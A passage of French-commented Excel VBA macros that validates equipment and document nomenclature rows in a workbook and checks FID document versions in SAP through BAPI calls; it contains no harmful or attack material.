    qte_articles = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_qte).Value)
    ' cas particulier
    If Cas = 1 Then qte_articles = 0: Repere = 0
    Obs = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_obs).Value)
    Note = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_note).Value)
    piece_rech = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_piece_rech).Value)
    If piece_rech = vbNullString Then piece_rech = "N"
    
    Document = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_document).Value)
    
    Tech = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_tech).Value)
    'ind_plan = vba.ucase(ThisWorkbook.Sheets(onglet).Cells(Lig, p_ind_plan).Value)
    If Tech = vbNullString Then Tech = "A"
    'pi|fffd|ce_rech = "F"
    clas_ssen = vbNullString
    ind_plan = vbNullString
    If Document = vbNullString Then
        for_plan = "IN"
        nb_planche = 1
    ElseIf Document = "SP" Then
        for_plan = "SP"
        nb_planche = 0
    ElseIf Document = "A0" Then
        for_plan = Document
        nb_planche = 1
    ElseIf Document = "A1" Then
        for_plan = Document
        nb_planche = 1
    ElseIf Document = "A2" Then
        for_plan = Document
        nb_planche = 1
    ElseIf Document = "A3" Then
        for_plan = Document
        nb_planche = 1
    ElseIf Document = "A4" Then
        for_plan = Document
        nb_planche = 1
    ElseIf Document = "IN" Then
        for_plan = Document
        nb_planche = 1
    ElseIf Document = "A?" Then
        for_plan = Document
        nb_planche = 1
    Else
        'obs = "#'document'#"
'            Obs = "#'" + Document + "'#" + Obs
        Obs = "#" + Document + "#" + Obs
        for_plan = "a?"
        nb_planche = 1
    End If
    
    ind_plan = vbNullString

    If NATURE = "B" Then
        PlanMABEC = etude_ref
        suf_mab = etude_suf
        ref_fab = vbNullString
        nom_fab = vbNullString
    ElseIf NATURE = "R" Then
        PlanMABEC = etude_ref
        suf_mab = etude_suf
        ref_fab = vbNullString
        nom_fab = vbNullString
    ElseIf NATURE = "F" Then
        PlanMABEC = vbNullString
        suf_mab = vbNullString
        nom_fab = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_etude_nom).Value)
        ref_fab = etude_ref
        If etude_suf > vbNullString Then ref_fab = ref_fab + "_" + etude_suf Else ref_fab = etude_ref
        If ref_int = vbNullString Then ref_int = ref_fab
        If nom_int = vbNullString Then nom_int = nom_fab
    ElseIf NATURE = "C" Then
        PlanMABEC = vbNullString
        suf_mab = vbNullString
        nom_fab = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_etude_nom).Value)
        ref_fab = etude_ref
        If etude_suf > vbNullString Then ref_fab = ref_fab + "_" + etude_suf Else ref_fab = etude_ref
    Else
        NATURE = "C"
        PlanMABEC = vbNullString
        suf_mab = vbNullString
        nom_fab = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_etude_nom).Value)
        ref_fab = etude_ref
        If etude_suf > vbNullString Then ref_fab = ref_fab + "_" + etude_suf Else ref_fab = etude_ref
    End If
    
    gen_ctrl_art
    
End Sub

Function cher_ssen(ssen As Variant) As Boolean
    Dim Fin As Boolean
    cher_ssen = False
    If ind_tab_ssen = 0 Then Fin = True Else Fin = False
    i = 1
    Do Until Fin
        If ssen = Tab_ssen(i) Then
            Fin = True
            cher_ssen = True
        Else
            i = i + 1
            If i > ind_tab_ssen Then Fin = True
        End If
    Loop
    If cher_ssen = False Then ind_tab_ssen = ind_tab_ssen + 1: Tab_ssen(ind_tab_ssen) = ssen
End Function

Function Conv_nb_element(ByVal Ch, El As String) As Integer
    Dim d, i As Integer
    Dim Fin As Boolean
    Dim data As Variant
    
    d = VBA.InStr(1, Ch, El)
    Fin = False
    i = 2
    data = "0"
    Do Until Fin
        If VBA.Mid(Ch, d + i, 1) = "0" Then
            data = data + VBA.Mid(Ch, d + i, 1)
        ElseIf VBA.Mid(Ch, d + i, 1) = "1" Then
            data = data + VBA.Mid(Ch, d + i, 1)
        ElseIf VBA.Mid(Ch, d + i, 1) = "2" Then
            data = data + VBA.Mid(Ch, d + i, 1)
        ElseIf VBA.Mid(Ch, d + i, 1) = "3" Then
            data = data + VBA.Mid(Ch, d + i, 1)
        ElseIf VBA.Mid(Ch, d + i, 1) = "4" Then
            data = data + VBA.Mid(Ch, d + i, 1)
        ElseIf VBA.Mid(Ch, d + i, 1) = "4" Then
            data = data + VBA.Mid(Ch, d + i, 1)
        ElseIf VBA.Mid(Ch, d + i, 1) = "5" Then
            data = data + VBA.Mid(Ch, d + i, 1)
        ElseIf VBA.Mid(Ch, d + i, 1) = "6" Then
            data = data + VBA.Mid(Ch, d + i, 1)
        ElseIf VBA.Mid(Ch, d + i, 1) = "7" Then
            data = data + VBA.Mid(Ch, d + i, 1)
        ElseIf VBA.Mid(Ch, d + i, 1) = "8" Then
            data = data + VBA.Mid(Ch, d + i, 1)
        ElseIf VBA.Mid(Ch, d + i, 1) = "9" Then
            data = data + VBA.Mid(Ch, d + i, 1)
        Else
            If d + i > d + 2 Then Fin = True
        End If
        i = i + 1
    Loop
    Conv_nb_element = data
End Function


Function cher_equipmt_niv_S(Equipmt As String) As Boolean
    Dim i As Integer, Nb_Articles As Integer, Nb_Documents As Integer
    Dim Fin As Boolean
    Dim Mes As String
    
    'Modif ACH du 12/02/2008, plantage si Tab_equipmt_adr est vide
    On Error GoTo erreur

    cher_equipmt_niv_S = False
    ' Si le tableau des equipements est vide, on passe
    If ind_tab_equipmt = 0 Then Fin = True Else Fin = False
    i = 1
    Do Until Fin
        If Equipmt = Tab_equipmt_cle(i) Then
            Fin = True
            Tab_equipmt_ong(i) = Tab_equipmt_ong(i)
            Tab_equipmt_adr(i) = Tab_equipmt_adr(i)

            Nb_Articles = ThisWorkbook.Sheets(shEquipmt).Cells(Tab_equipmt_adr(i), 20).Value
            Nb_Documents = ThisWorkbook.Sheets(shEquipmt).Cells(Tab_equipmt_adr(i), 21).Value
            
            If Onglet = shDecoupage Then
                If ThisWorkbook.Sheets(Tab_equipmt_ong(i)).Cells(Tab_equipmt_adr(i), 21).Value <> "N" Then ThisWorkbook.Sheets(Tab_equipmt_ong(i)).Cells(Tab_equipmt_adr(i), 47).Value = "Mat-Exist"
            ElseIf Onglet = shMateriels Then
                Nb_Articles = Nb_Articles + 1
                ThisWorkbook.Sheets(shEquipmt).Cells(Tab_equipmt_adr(i), 20).Value = Nb_Articles
            ElseIf Onglet = shDocuments Then
                Nb_Documents = Nb_Documents + 1
                ThisWorkbook.Sheets(shEquipmt).Cells(Tab_equipmt_adr(i), 21).Value = Nb_Documents
            End If

            Mes = vbNullString
            If ThisWorkbook.Sheets(Tab_equipmt_ong(i)).Cells(Tab_equipmt_adr(i), 21).Value = "O" Then
                If Nb_Articles > 0 And Nb_Documents > 0 Then Mes = Msg_Nomenclature_OK
                If Nb_Articles > 0 And Nb_Documents = 0 Then Mes = Msg_Document_NOK
                If Nb_Articles = 0 And Nb_Documents > 0 Then Mes = Msg_Materiel_NOK
                If Nb_Articles = 0 And Nb_Documents = 0 Then Mes = Msg_Nomenclature_NOK
            ElseIf ThisWorkbook.Sheets(Tab_equipmt_ong(i)).Cells(Tab_equipmt_adr(i), 21).Value = "D" Then
                If Nb_Documents > 0 And Nb_Articles > 0 Then Mes = Msg_Materiel_Exist
                If Nb_Documents > 0 And Nb_Articles = 0 Then Mes = Msg_Document_OK
                If Nb_Documents = 0 And Nb_Articles > 0 Then Mes = Msg_Document_NOK
                If Nb_Documents = 0 And Nb_Articles = 0 Then Mes = Msg_Document_NOK
            ElseIf ThisWorkbook.Sheets(Tab_equipmt_ong(i)).Cells(Tab_equipmt_adr(i), 21).Value = "M" Then
                If Nb_Articles > 0 And Nb_Documents > 0 Then Mes = Msg_Document_Exist
                If Nb_Articles > 0 And Nb_Documents = 0 Then Mes = Msg_Materiel_OK
                If Nb_Articles = 0 And Nb_Documents > 0 Then Mes = Msg_Materiel_NOK
                If Nb_Articles = 0 And Nb_Documents = 0 Then Mes = Msg_Materiel_NOK
            Else
                If Nb_Articles > 0 And Nb_Documents > 0 Then Mes = Msg_Nomenclature_Exist
                If Nb_Articles > 0 And Nb_Documents = 0 Then Mes = Msg_Materiel_Exist
                If Nb_Articles = 0 And Nb_Documents > 0 Then Mes = Msg_Document_Exist
                If Nb_Articles = 0 And Nb_Documents = 0 Then Mes = Msg_Nomenclature_NC
            End If
            
            ThisWorkbook.Sheets(Tab_equipmt_ong(i)).Cells(Tab_equipmt_adr(i), 47).Value = Mes
            Assistance_Anomalie Mes, ThisWorkbook.Sheets(Tab_equipmt_ong(i)).Cells(Tab_equipmt_adr(i), 47), Equipmt
            
            'Interdiction de Charger des Donn|fffd|es dans RENOM, si pas de p|fffd|re dans l'onglet Decoupage (Erreurs Fatales)
            If VBA.InStr(Mes, "_Exist") <> 0 Then
                cher_equipmt_niv_S = False
                With ThisWorkbook.Sheets(Tab_equipmt_ong(i)).Cells(Tab_equipmt_adr(i), 47).Font
                    .FontStyle = "Bold"
                    .ColorIndex = 3
                End With
            Else
                cher_equipmt_niv_S = True
            End If
        Else
            i = i + 1
            If i > ind_tab_equipmt Or Tab_equipmt_ong(i) = vbNullString Then Fin = True
        End If
    Loop

'Modif ACH du 12/02/2008, plantage si Tab_equipmt_adr est vide
erreur:
    On Error GoTo 0
End Function



Function cher_equipmt(Equipmt As Variant, shName As String) As Integer
    Dim i As Integer
    Dim Fin As Boolean

    cher_equipmt = 0
    If ind_tab_equipmt = 0 Then Fin = True Else Fin = False
    i = 1
 
    Do Until Fin
        If Equipmt = Tab_equipmt_cle(i) Then
            Fin = True
            cher_equipmt = i
        Else
            i = i + 1
            If i > ind_tab_equipmt Then Fin = True
         End If
    Loop
    If cher_equipmt = 0 Then
        ' cas d'un nouvel |fffd|quipement
        ind_tab_equipmt = ind_tab_equipmt + 1
        Tab_equipmt_cle(ind_tab_equipmt) = Equipmt
        Tab_equipmt_ong(ind_tab_equipmt) = shName
        Tab_equipmt_adr(ind_tab_equipmt) = Lig
    End If
End Function

Sub gen_ctrl_equ()
    ind_equipmt = ind_equipmt + 1
    ThisWorkbook.Sheets(shEquipmt).Cells(ind_equipmt, 15).Value = Num_ligne
    ThisWorkbook.Sheets(shEquipmt).Cells(ind_equipmt, 1).Value = lib_tn2
    ThisWorkbook.Sheets(shEquipmt).Cells(ind_equipmt, 2).Value = cod_class
    ThisWorkbook.Sheets(shEquipmt).Cells(ind_equipmt, 3).Value = N_invent
    ThisWorkbook.Sheets(shEquipmt).Cells(ind_equipmt, 4).Value = N_suffixe
    ThisWorkbook.Sheets(shEquipmt).Cells(ind_equipmt, 5).Value = lib_invent
    ThisWorkbook.Sheets(shEquipmt).Cells(ind_equipmt, 6).Value = N_mat
    ThisWorkbook.Sheets(shEquipmt).Cells(ind_equipmt, 7).Value = lib_mat
    ThisWorkbook.Sheets(shEquipmt).Cells(ind_equipmt, 8).Value = nom_four_equ
    ThisWorkbook.Sheets(shEquipmt).Cells(ind_equipmt, 9).Value = ref_mach_equ
    
    ThisWorkbook.Sheets(shEquipmt).Cells(ind_equipmt, 10).Value = Date_creat
    Nb_element_bdn = Nb_element_bdn + 1
    ThisWorkbook.Sheets(shEquipmt).Cells(ind_equipmt, 11).Value = Pos_creat + Nb_element_bdn
    
    If Document <> "SP" Then
        nb_document = nb_document + 1
    End If
End Sub


Sub charge_equipement(wS As Worksheet)
    Dim Nb_m As Integer, Nb_d As Integer

    N_invent = VBA.UCase(wS.Cells(Lig, P_etude_ref).Value)
    N_suffixe = VBA.UCase(wS.Cells(Lig, P_etude_suf).Value)
    mem_equipmt = N_invent & "_" & N_suffixe
    mem_inv = N_invent
    mem_inv_suf = N_suffixe
    
    If cher_equipmt(mem_equipmt, wS.Name) Then
        Nomencl = "N"
        wS.Cells(Lig, P_etude_ref).Font.Bold = True
        wS.Cells(Lig, P_CtrL_For_dec + 1).Font.Bold = False
        wS.Cells(Lig, P_CtrL_For_dec + 1).Value = Msg_E_Multiple
        Assistance_Anomalie Msg_E_Multiple, wS.Cells(Lig, P_CtrL_For_dec + 1), mem_equipmt
    Else
        wS.Cells(Lig, P_etude_ref).Font.Bold = False
        wS.Cells(Lig, P_CtrL_For_dec + 1).Font.Bold = False
        If Nomencl = "O" Then
            Nb_m = ThisWorkbook.Sheets(shEquipmt).Cells(Lig, 20).Value
            Nb_d = ThisWorkbook.Sheets(shEquipmt).Cells(Lig, 21).Value
            wS.Cells(Lig, P_CtrL_For_dec + 1).Value = Msg_Nomenclature_NOK
            Assistance_Anomalie Msg_Nomenclature_NOK, wS.Cells(Lig, P_CtrL_For_dec + 1), mem_equipmt
        ElseIf Nomencl = "D" Then
            Nb_m = ThisWorkbook.Sheets(shEquipmt).Cells(Lig, 20).Value
            Nb_d = ThisWorkbook.Sheets(shEquipmt).Cells(Lig, 21).Value
            wS.Cells(Lig, P_CtrL_For_dec + 1).Value = Msg_Document_NOK
            Assistance_Anomalie Msg_Document_NOK, wS.Cells(Lig, P_CtrL_For_dec + 1), mem_equipmt
        ElseIf Nomencl = "M" Then
            Nb_m = ThisWorkbook.Sheets(shEquipmt).Cells(Lig, 20).Value
            Nb_d = ThisWorkbook.Sheets(shEquipmt).Cells(Lig, 21).Value
            wS.Cells(Lig, P_CtrL_For_dec + 1).Value = Msg_Materiel_NOK
            Assistance_Anomalie Msg_Materiel_NOK, wS.Cells(Lig, P_CtrL_For_dec + 1), mem_equipmt
        Else
            wS.Cells(Lig, P_CtrL_For_dec + 1).Value = Msg_Materiel_NC
        End If
        'If nomencl <> "N" Then
            'Nb_m = ThisWorkbook.Sheets(shEquipmt).Cells(lig, 20).Value
            'Nb_d = ThisWorkbook.Sheets(shEquipmt).Cells(lig, 21).Value
            'ws.Cells(lig, P_CtrL_For_dec + 1).Value = Msg_Nomenclature_NOK
            'ws.Cells(lig, P_CtrL_For_dec + 1).Value = "E:0 M:0 D:0" '"Mat-NoK"
        'Else
        '    ws.Cells(lig, P_CtrL_For_dec + 1).Value = Msg_Materiel_NC
        'End If
    End If
    'ws.Cells(lig, P_CtrL_For_dec + 1).Value = vbnullstring
    ' lib_tn2
    lib_tn2 = VBA.UCase(wS.Cells(Lig, P_efp).Value)
    lib_tn2 = lib_tn2 + VBA.UCase(wS.Cells(Lig, P_fp).Value)
    lib_invent = VBA.UCase(wS.Cells(Lig, P_design).Value)
      ' Matricule
    'N_mat = vba.ucase(ws.Cells(lig, P_N_mat).Value)
    'lib_mat = vba.ucase(ws.Cells(lig, P_lib_mat).Value)
    ' Reference fournisseur
    nom_four_equ = VBA.UCase(wS.Cells(Lig, P_nom_int).Value)
    ref_mach_equ = VBA.UCase(wS.Cells(Lig, P_ref_int).Value)

    Document = VBA.UCase(wS.Cells(Lig, P_document).Value)
    If Nomencl = "O" Or Nomencl = vbNullString Or Nomencl = "M" Or Nomencl = "D" Then gen_ctrl_equ
    'If nomencl = "O" Or nomencl = vbnullstring Then gen_ctrl_equ
End Sub


Function cher_ssen_ssen(ssen As Variant) As Boolean
    Dim Fin As Boolean
    cher_ssen_ssen = False
    If ind_tab_ssen_ssen = 0 Then Fin = True Else Fin = False
    
    i = 1
    Do Until Fin
        If ssen = Tab_ssen_ssen(i) Then
            Fin = True
            cher_ssen_ssen = True
        Else
            i = i + 1
            If i > ind_tab_ssen_ssen Then Fin = True
         End If
    Loop
    If Not cher_ssen_ssen Then
        ind_tab_ssen_ssen = ind_tab_ssen_ssen + 1
        Tab_ssen_ssen(ind_tab_ssen_ssen) = ssen
    Else
        
    End If
End Function

Function cher_equipmt_dec(Equipmt As Variant) As Integer
    Dim i As Integer
    cher_equipmt_dec = 0
    Fin = False
    i = 1
    Do Until i > ind_tab_equipmt
        If Equipmt = Tab_equipmt_cle(i) Then cher_equipmt_dec = Tab_equipmt_adr(i): Exit Do
        i = i + 1
    Loop
    ind_tab_equipmt = ind_tab_equipmt + 1
    Tab_equipmt_cle(ind_tab_equipmt) = Equipmt
End Function

Sub Assistance_Anomalie(CodeMsg As String, Rng As Range, ByVal Equipement As String)
    Dim Message As String

    If Not Assistance Then Exit Sub
    Message = vbNullString
    
    If VBA.Right(Equipement, 1) = "_" Then Equipement = VBA.Left(Equipement, VBA.Len(Equipement) - 1)
    If CodeMsg = Msg_Nomenclature_NOK Then
        Message = IniCls.ReadStringIniLangage("MsgFWK", "MsgDefMatDoc") & " " & IniCls.ReadStringIniLangage("MsgFWK", "MsgMatDocMiss") & " : " & Equipement
    ElseIf CodeMsg = Msg_Materiel_NOK Then
        Message = IniCls.ReadStringIniLangage("MsgFWK", "MsgDefMat") & " " & IniCls.ReadStringIniLangage("MsgFWK", "MsgMatMiss") & " : " & Equipement
    ElseIf CodeMsg = Msg_Document_NOK Then
        Message = IniCls.ReadStringIniLangage("MsgFWK", "MsgDefDoc") & " " & IniCls.ReadStringIniLangage("MsgFWK", "MsgDocMiss") & " : " & Equipement
    ElseIf CodeMsg = Msg_Nomenclature_Exist Then
        Message = IniCls.ReadStringIniLangage("MsgFWK", "MsgDefMatDoc") & " " & IniCls.ReadStringIniLangage("MsgFWK", "MsgMatDocExist") & " : " & Equipement
    ElseIf CodeMsg = Msg_Materiel_Exist Then
        Message = IniCls.ReadStringIniLangage("MsgFWK", "MsgDefMat") & " " & IniCls.ReadStringIniLangage("MsgFWK", "MsgMatExist") & " : " & Equipement
    ElseIf CodeMsg = Msg_Document_Exist Then
        Message = IniCls.ReadStringIniLangage("MsgFWK", "MsgDefDoc") & " " & IniCls.ReadStringIniLangage("MsgFWK", "MsgDocExist") & " : " & Equipement
    ElseIf CodeMsg = Msg_Dec_Nok Then
        Message = IniCls.ReadStringIniLangage("MsgFWK", "MsgRefMat") & " : " & Equipement & " " & IniCls.ReadStringIniLangage("MsgFWK", "MsgNoFather")
    ElseIf CodeMsg = Msg_E_Multiple Then
        Message = IniCls.ReadStringIniLangage("MsgFWK", "MsgEquipement") & " : " & Equipement & " " & IniCls.ReadStringIniLangage("MsgFWK", "MsgTooMore")
    ElseIf CodeMsg = Msg_Doublon_SSen Then
        Message = IniCls.ReadStringIniLangage("MsgFWK", "MsgSSeTooMore") & " : " & Equipement
    ElseIf CodeMsg = Msg_Suffixe_Absent Then
        Message = IniCls.ReadStringIniLangage("MsgFWK", "MsgSufMissing")
    ElseIf CodeMsg = "MsgDoublonDoc" Then
        Message = "Documentation en Doublon" 'IniCls.ReadStringIniLangage("MsgFWK", "MsgDoublonDocument") Plante la Recherche dans Recherche_Doublons_Documents
    End If
    
    If Message <> vbNullString Then
        With Rng
            With .Font
                If CodeMsg = Msg_E_Multiple Then .ColorIndex = xlAutomatic Else .ColorIndex = 3
                .Bold = True
            End With
            If .Comment Is Nothing Then .AddComment                 ' Le commentaire n'existe pas, on le cr|fffd|e
            'Pour |fffd|viter le Message "Impossible de d|fffd|placer des objets en dehors de la feuille"
            .Comment.Shape.Placement = xlMoveAndSize
            .Comment.Text Message
            .Comment.Shape.Width = 200
        End With
    Else
        If Not Rng.Comment Is Nothing Then Rng.Comment.Delete
        Rng.Font.ColorIndex = xlAutomatic
        Rng.Font.Bold = False
    End If
End Sub


Sub Assistance_Anomalie_Lien(Onglet As String, Ligne As Long, Col1 As Integer, Col2 As Integer, Invent As String, Suffixe As String)
    Dim Message As String
    
    If Not Assistance Then Exit Sub
    
    Message = IniCls.ReadStringIniLangage("MsgFWK", "MsgLienNok") & vbCrLf & _
              IniCls.ReadStringIniLangage("MsgFWK", "MsgElement") & " " & vbNullString & Invent & vbNullString & " " & _
              IniCls.ReadStringIniLangage("MsgFWK", "MsgAvSuffixe") & " " & vbNullString & Suffixe & vbNullString & ", " & _
              IniCls.ReadStringIniLangage("MsgFWK", "MsgNoLien")
    
    If Onglet = shDocuments Then Message = Message & vbCrLf & IniCls.ReadStringIniLangage("MsgFWK", "MsgLienFIDR") Else Message = Message & vbCrLf & IniCls.ReadStringIniLangage("MsgFWK", "MsgLienArt")
    
    With ThisWorkbook.Worksheets(Onglet).Cells(Ligne, Col1) 'Mat|fffd|riel Sup|fffd|rieur
        With .Font
            .ColorIndex = 3
            .Bold = True
        End With
        If .Comment Is Nothing Then .AddComment Else Message = .Comment.Text & vbCrLf & vbCrLf & Message
        'Pour |fffd|viter le Message "Impossible de d|fffd|placer des objets en dehors de la feuille"
        .Comment.Shape.Placement = xlMoveAndSize
        .Comment.Text Message
        .Comment.Shape.Width = 200
    End With
    
    With ThisWorkbook.Worksheets(Onglet).Cells(Ligne, Col2) ' Suffixe du P|fffd|re
        With .Font
            .ColorIndex = 3
            .Bold = True
        End With
        If .Comment Is Nothing Then .AddComment Else Message = .Comment.Text & vbCrLf & vbCrLf & Message
        'Pour |fffd|viter le Message "Impossible de d|fffd|placer des objets en dehors de la feuille"
        .Comment.Shape.Placement = xlMoveAndSize
        .Comment.Text Message
        .Comment.Shape.Width = 200
    End With
End Sub


Attribute VB_Name = "TDI_FID"
'v1.03 : passage au statut VA de la version "-" dans SAP si indice de la nouvelle version > "-"
'v1.2 : prise en compte de RACINE
'v1.3 : ajout des deux champs observation et flag reprise des originaux (adaptation aux correctifs de la LSMW)

Option Explicit
Const I_TYPEMESSAGE = 1
Const I_MESSAGE = 2
Const I_TYPE = 3
Const I_NOM = 4
Const I_NEWINDICE = 5
Const I_CODELANGUE = 6
Const I_LIBELLE = 7
Const I_FIDR = 8
Const I_OBSERVATIONS = 9
Const I_EQT = 10
Const I_PT = 11
Const I_ARTICLE = 12
Const I_PLANREF = 13
Const I_CHEMIN = 14
Const I_FICHIERS = 15

Const I_INDICESAP = 16
Const I_STATUTSAP = 17
Const I_NBFICHIERS = 18
Const I_ISDELETED = 19

Const C_DEBFID = "C"
Const C_FINFID = "O"

Const C_DEBSAP = "P"
Const C_FINSAP = "R"

Const CREATION_FID = "CREER_FID"
Const MODIF_FID = "MODIFIER_FID"
Const CHARGER_ORI = "CHARGER_ORIG"
Const SUPPRIMER_ORI = "SUPPRIMER_ORIG"

Public Function AuTravail(bExport As Boolean)
    Dim row As Object, oCheckoutView2 As Object
    Dim iCol As Integer, iRow As Integer, i As Integer, iLigneORIG As Integer, iNbDocu As Integer, iLigneLIENS As Integer, iLigneFID As Integer, iNumOri As Integer
    Dim oRETURN As Object, oDOCUMENTDATA As Object, oACTUALVERSION As Object, oDOCUMENTFILES As Object, oDOCUMENTISDELETED As Object
    Dim oGetDetail As Object, oGetCurrentVersion As Object, oExistenceCheck1 As Object
    Dim sIndice As String, sIndiceSAP As String, sType As String, sNom As String, sLibelle As String, sStatusSAP As String, sCodeLangue As String, sPlanRef As String, sFIDR As String, sObservations As String, sDeleted As String
    Dim bErreur As Boolean, bUneErreur As Boolean
        
    frmLoginSAP.Show
    If frmLoginSAP.bLogOk = False Then Exit Function
    
    'On inhibe l'affichage
    GererConfiguration False
    Application.StatusBar = vbNullString
    
    With Worksheets(shListeDeFID)
        Application.StatusBar = "Purge des donn|fffd|es ant|fffd|rieures ..."
        'SAPLogon oBapiCtrl
        ' suppression des donn|fffd|es pr|fffd|c|fffd|dentes
        'suppression des donn|fffd|es de contr|fffd|le de l'onglet principal
        .Select
        .Range("A5:B65535").ClearContents
        .Range(C_DEBSAP & "5:" & C_FINSAP & "65535").ClearContents
        .Range("A5:V65535").Interior.Pattern = xlNone
        .Range("A1:A1").Select
   
        ' Nettoyage des onglets d'export
        If bExport Then Worksheets(shListe_FID).Range("A2:Z65535").ClearContents: Worksheets(shListe_Originaux).Range("A2:Z65535").ClearContents: Worksheets(shListe_Liens).Range("A2:Z65535").ClearContents
    
        ' On balaie toutes les donn|fffd|es de la feuille de donn|fffd|es Liste de FID
        .Select
        .Range("A1:A1").Select
        
        iRow = 5
        iLigneFID = 1
        iLigneORIG = 1
        iLigneLIENS = 1
        bUneErreur = False
        While .Cells(iRow, I_NOM) <> vbNullString
            bErreur = False
            Application.StatusBar = "Traitement de la ligne " & iRow - 4 & " en cours..."
            'on r|fffd|cup|fffd|re les donn|fffd|es en entr|fffd|e
            sType = .Cells(iRow, I_TYPE)
            sNom = "S" & .Cells(iRow, I_NOM)
            sIndice = .Cells(iRow, I_NEWINDICE)
            If sIndice = vbNullString Then sIndice = "-"
            sCodeLangue = .Cells(iRow, I_CODELANGUE)
            sLibelle = .Cells(iRow, I_LIBELLE)
            sObservations = .Cells(iRow, I_OBSERVATIONS)
            sPlanRef = .Cells(iRow, I_PLANREF)
            If sPlanRef <> vbNullString Then sPlanRef = "S" & sPlanRef
            sFIDR = .Cells(iRow, I_FIDR)
            If sFIDR <> vbNullString Then
                sFIDR = "S" & sFIDR
            End If

            If VBA.Len(sNom) > 25 Then
                bErreur = True
                bUneErreur = True
                .Cells(iRow, I_NOM).Interior.ColorIndex = 3
                .Cells(iRow, I_MESSAGE) = "Le nom de la FID doit faire 25 caract|fffd|res maximum !"
            End If

            If VBA.Len(sLibelle) > 40 Then
                bErreur = True
                bUneErreur = True
                .Cells(iRow, I_LIBELLE).Interior.ColorIndex = 3
                .Cells(iRow, I_MESSAGE) = "Le libell|fffd| de la FID doit faire 40 caract|fffd|res maximum !"
            End If
            
            If VBA.InStr(sLibelle, ";") > 0 Then
                bErreur = True
                bUneErreur = True
                .Cells(iRow, I_LIBELLE).Interior.ColorIndex = 3
                .Cells(iRow, I_MESSAGE) = "Le caract|fffd|re vbnullstring;vbnullstring est interdit dans le libell|fffd|."
            End If

            If VBA.Len(sObservations) > 255 Then
                bErreur = True
                bUneErreur = True
                .Cells(iRow, I_OBSERVATIONS).Interior.ColorIndex = 3
                .Cells(iRow, I_MESSAGE) = "Le champ observations de la FID doit faire 255 caract|fffd|res maximum !"
            End If

            If VBA.InStr(sObservations, ";") > 0 Then
                bErreur = True
                bUneErreur = True
                .Cells(iRow, I_OBSERVATIONS).Interior.ColorIndex = 3
                .Cells(iRow, I_MESSAGE) = "Le caract|fffd|re vbnullstring;vbnullstring est interdit dans la zone observation."
            End If

            If sType = vbNullString Then
                bErreur = True
                bUneErreur = True
                .Cells(iRow, I_TYPE).Interior.ColorIndex = 3
                .Cells(iRow, I_MESSAGE) = "Il manque des donn|fffd|es obligatoires !"
            End If
            
            If sCodeLangue = vbNullString Then
                bErreur = True
                bUneErreur = True
                .Cells(iRow, I_CODELANGUE).Interior.ColorIndex = 3
                .Cells(iRow, I_MESSAGE) = "Il manque des donn|fffd|es obligatoires !"
            End If
            
            If sLibelle = vbNullString Then
                bErreur = True
                bUneErreur = True
                .Cells(iRow, I_LIBELLE).Interior.ColorIndex = 3
                .Cells(iRow, I_MESSAGE) = "Il manque des donn|fffd|es obligatoires !"
            End If
            
            If sPlanRef = vbNullString And VBA.UCase(Left(sType, 1)) <> "R" Then
                If .Cells(iRow, I_CHEMIN) = vbNullString Then
                    bErreur = True
                    bUneErreur = True
                    .Cells(iRow, I_CHEMIN).Interior.ColorIndex = 3
                    .Cells(iRow, I_MESSAGE) = "Il manque des donn|fffd|es obligatoires !"
                End If
                
                If .Cells(iRow, I_FICHIERS) = vbNullString Then
                    bErreur = True
                    bUneErreur = True
                    .Cells(iRow, I_FICHIERS).Interior.ColorIndex = 3
                    .Cells(iRow, I_MESSAGE) = "Il manque des donn|fffd|es obligatoires !"
                End If
            End If
            
            If bErreur Then
                ' Erreur sur la ligne : la ligne n'est pas trait|fffd|e
                .Cells(iRow, I_TYPEMESSAGE) = "erreur"
                .Cells(iRow, I_TYPEMESSAGE).Interior.ColorIndex = 3
            Else
                ' Pas d'erreur sur la ligne : on la traite
                ' recherche de la derni|fffd|re version dans SAP
                Set oGetCurrentVersion = oBapiCtrl.Add("BAPI_DOCUMENT_GETACTVERSION")
                oGetCurrentVersion.exports("DOCUMENTNUMBER") = sNom
                oGetCurrentVersion.exports("DOCUMENTTYPE") = sType
                oGetCurrentVersion.exports("DOCUMENTPART") = "000"
                If oGetCurrentVersion.Call = True Then
                    Set oACTUALVERSION = oGetCurrentVersion.imports("ACTUALVERSION")
                    sIndiceSAP = oACTUALVERSION.Value
                    If sIndiceSAP = vbNullString Then
                        'La FID n'existe pas !
                        .Cells(iRow, I_TYPEMESSAGE) = "info"
                        .Cells(iRow, I_TYPEMESSAGE).Select
                        Selection.Interior.ColorIndex = 4
                        
                        If VBA.UCase(Left(sType, 1)) = "R" Then
                            'on cr|fffd|e une FID R
                            .Cells(iRow, I_MESSAGE) = "La FID n'existe pas dans SAP, elle sera cr|fffd||fffd|e en type 'r|fffd|pertoire'."
                            If bExport Then
                                AjouterLigneFid iLigneFID, sType, sNom, "00", sCodeLangue, sLibelle, CREATION_FID, vbNullString, vbNullString, sFIDR, sObservations
                                AjouterLigneLiens iLigneLIENS, sType, sNom, "00", iRow
                            End If
                        ElseIf sPlanRef = vbNullString Then
                            .Cells(iRow, I_MESSAGE) = "La FID n'existe pas dans SAP, elle sera cr|fffd||fffd|e |fffd| l'|fffd|tat VA."
                            If bExport Then
                                AjouterLigneFid iLigneFID, sType, sNom, sIndice, sCodeLangue, sLibelle, CREATION_FID, "VA", sPlanRef, sFIDR, sObservations
                                AjouterLigneOrig iLigneORIG, sType, sNom, sIndice, CHARGER_ORI, "ZGD", vbNullString, iRow, vbNullString, vbNullString
                                AjouterLigneLiens iLigneLIENS, sType, sNom, sIndice, iRow
                            End If
                        Else
                            .Cells(iRow, I_MESSAGE) = "La FID n'existe pas dans SAP, elle sera cr|fffd||fffd|e |fffd| l'|fffd|tat RF."
                            If bExport Then
                                AjouterLigneFid iLigneFID, sType, sNom, sIndice, sCodeLangue, sLibelle, CREATION_FID, "RF", sPlanRef, sFIDR, sObservations
                                AjouterLigneLiens iLigneLIENS, sType, sNom, sIndice, iRow
                            End If
                        End If
                    Else
